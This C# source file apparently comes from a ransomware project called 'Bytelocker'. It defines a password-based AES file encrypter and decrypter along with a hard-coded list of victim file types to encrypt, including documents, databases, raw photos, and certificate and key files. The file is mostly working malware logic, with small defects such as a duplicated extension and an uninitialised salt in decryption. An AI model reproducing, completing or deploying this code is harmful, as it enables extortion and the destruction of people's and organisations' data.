using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Bytelocker.CryptoManager
{
    internal class FileEncrypter : PasswordManager
    {
        private const int AES_KEYSIZE = 256;
        private const int WRITE_BUFFER = 1048576;
        private const int AES_BLOCK_SIZE = 128;
        private const PaddingMode AES_PADDING_MODE = PaddingMode.PKCS7;
        private const CipherMode CIPHER_MODE = CipherMode.CFB;

        public static string FILE_EXTENSION_ENCRYPT_TMP = ".bytcrypttmp";

        public static List<string> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>
        {
            ".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps", ".xls", ".xlsx", ".xlsm",
            ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb", ".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf",
            ".wb2", ".mdf", ".dbf", ".psd", ".pdd", ".pdf", ".eps", ".ai", ".indd",
            ".cdr", ".jpg", ".jpe", ".jpg", ".dng", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr",
            ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl",
            ".rw2", ".r3d", ".ptx", ".pef", ".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12", ".p7b",
            ".p7c"
        };

        private string file_path;
        private byte[] salt;

        public void ChooseFile(string file_path)
        {
            this.file_path = file_path;
        }

        public void GenerateRandomSalt()
        {
            var objAES = new Aes();
            salt = objAES.GenerateRandomSalt();
        }

        public void Encrypt()
        {
            // create encrypted file name
            var fs = new FileStream(file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);

            // use Rijndael encryption algor.
            var rm = new RijndaelManaged();
            rm.KeySize = AES_KEYSIZE;
            rm.BlockSize = AES_BLOCK_SIZE;
            rm.Padding = AES_PADDING_MODE;

            var key = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(password), salt, 50000);
            rm.Key = key.GetBytes(rm.KeySize / 8);
            rm.IV = key.GetBytes(rm.BlockSize / 8);

            rm.Mode = CIPHER_MODE;

            fs.Write(salt, 0, salt.Length);

            var cs = new CryptoStream(fs, rm.CreateEncryptor(), CryptoStreamMode.Write);
            var fsIn = new FileStream(file_path, FileMode.Open);

            var buffer = new byte[WRITE_BUFFER];
            int count;

            // write new file
            try
            {
                while ((count = fsIn.Read(buffer, 0, buffer.Length)) > 0) cs.Write(buffer, 0, count);

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fs.Close();
            }
        }

        public void Decrypt()
        {
            var fs = new FileStream(file_path, FileMode.Open);
            fs.Read(salt, 0, salt.Length);

            var rm = new RijndaelManaged();
            rm.KeySize = AES_KEYSIZE;
            rm.BlockSize = AES_BLOCK_SIZE;
            var key = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(password), salt, 50000);
            rm.Key = key.GetBytes(rm.KeySize / 8);
            rm.IV = key.GetBytes(rm.BlockSize / 8);
            rm.Padding = AES_PADDING_MODE;
            rm.Mode = CIPHER_MODE;

            var cs = new CryptoStream(fs, rm.CreateDecryptor(), CryptoStreamMode.Read);
            var fsOut = new FileStream(file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);

            var buffer = new byte[WRITE_BUFFER];
            int count;

            try
            {
                while ((count = cs.Read(buffer, 0, buffer.Length)) > 0) fsOut.Write(buffer, 0, count);

                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fs.Close();
            }
        }
    }
}